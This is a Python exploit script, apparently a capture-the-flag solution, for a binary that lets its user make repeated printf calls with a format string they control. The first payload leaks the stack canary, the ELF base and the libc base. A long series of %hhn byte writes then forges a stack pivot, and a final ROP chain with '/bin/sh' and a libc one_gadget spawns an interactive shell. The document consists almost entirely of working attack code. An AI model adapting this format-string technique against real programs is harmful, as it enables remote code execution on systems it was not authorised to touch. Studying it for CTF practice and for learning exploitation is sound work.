#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b"I'll let you make one printf call. You control the format string. No do-overs.\n")
payload = b"a%7$hhn"
payload += b".%p"*30
sl(payload)

ru(b".")
ru(b".")
ru(b".")
ru(b".")
buf_addr = int(ru(b".", drop=True), 16)
ru(b".")
elf_base = int(ru(b".", drop=True), 16) - 0x1120
ru(b".")
stack_base = int(ru(b".", drop=True), 16) - 0x20
ru(b".")
ru(b".")
canary = int(ru(b".", drop=True), 16)
ru(b".")
libc_base = int(ru(b".", drop=True), 16) - 0x24083
lg("buf_addr")
lg("elf_base")
lg("stack_base")
lg("canary")
lg("libc_base")

fake_rbp = buf_addr + 0x100
fake_rbp_ptr = stack_base + 0x20

curr = 0
def count_payload(target):
    global curr
    temp = curr
    curr = target
    if target >= temp:
        return str(target - temp).encode()
    else:
        return str((0x100 - temp) + target).encode()

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + str( (fake_rbp_ptr & 0xffff) - curr ).encode() + b"c%15$hn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( fake_rbp & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+1) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (fake_rbp>>8) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+2) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (fake_rbp>>0x10) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+3) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (fake_rbp>>0x18) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+4) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (fake_rbp>>0x20) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+5) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (fake_rbp>>0x28) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+6) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (fake_rbp>>0x30) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+8) & 0xff ) + b"c%15$hhn"
sl(payload)

leave_ret = elf_base+0x1292

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (leave_ret) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+9) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (leave_ret>>8) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+10) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (leave_ret>>0x10) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+11) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (leave_ret>>0x18) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+12) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (leave_ret>>0x20) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (fake_rbp_ptr+13) & 0xff ) + b"c%15$hhn"
sl(payload)

ru(b"Okay, I'll give you another chance.\n")
payload = b"a%7$hhn"
curr = 1
payload += b"%" + count_payload( (leave_ret>>0x28) & 0xff ) + b"c%43$hhn"
payload += b"%" + count_payload( (stack_base+8) & 0xff ) + b"c%15$hhn"
sl(payload)

pop_rdi_ret = elf_base+0x0000000000001373
#  syscal_addr =

ru(b"Okay, I'll give you another chance.\n")
payload = b"aa%7$hhn"
curr = 2
payload += b"%" + count_payload( (0x92) & 0xff ) + b"c%43$hhn"
payload = payload.ljust(0xd0, b"\x00")
payload += b"/bin/sh\x00"
payload = payload.ljust(0x100, b"\x00")
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(libc_base + 0xe3b04)
#  payload += p64(libc_base + libc.sym.system)
lg("len(payload)")
sl(payload)

ia()
